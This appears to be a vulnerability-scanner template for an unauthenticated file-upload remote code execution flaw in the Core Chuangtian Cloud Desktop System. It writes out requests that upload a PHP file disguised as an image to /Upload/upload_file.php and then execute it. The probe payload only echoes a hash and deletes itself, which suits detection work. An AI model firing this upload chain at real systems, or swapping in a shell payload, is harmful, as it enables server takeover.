id: core-chuangtian-cloud-rce
brief:
    title: Core Chuangtian Cloud Desktop System - Remote Code Execution
    by: pikpikcu
    level: critical
    about: Core Chuangtian Cloud Desktop System is susceptible to remote code execution vulnerabilities.
    label:
        - rce
        - fileupload
        - intrusive
        - cloud
        - chuangtian
        - vuln
    score: CVSS:10.0
moves:
    - verb: POST
      to:
        - '{{BaseURL}}/Upload/upload_file.php?l=test'
      head:
        Accept: image/avif,image/webp,image/apng,image/*,*/*;q=0.8
        Accept-Encoding: gzip, deflate
        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryfcKRltGv
        Cookie: think_language=zh-cn; PHPSESSID_NAMED=h9j8utbmv82cb1dcdlav1cgdf6
      body: |-
        ------WebKitFormBoundaryfcKRltGv
        Content-Disposition: form-data; name="file"; filename="{{randstr}}.php"
        Content-Type: image/avif

        <?php echo md5("{{string}}");unlink(__FILE__);?>
        ------WebKitFormBoundaryfcKRltGv--
      signs:
        - "on": word
          has:
            - '{{md5(string)}}'
          in: body_2
    - verb: GET
      to:
        - '{{BaseURL}}/Upload/test/{{randstr}}.php'
      signs:
        - "on": word
          has:
            - '{{md5(string)}}'
          in: body_2
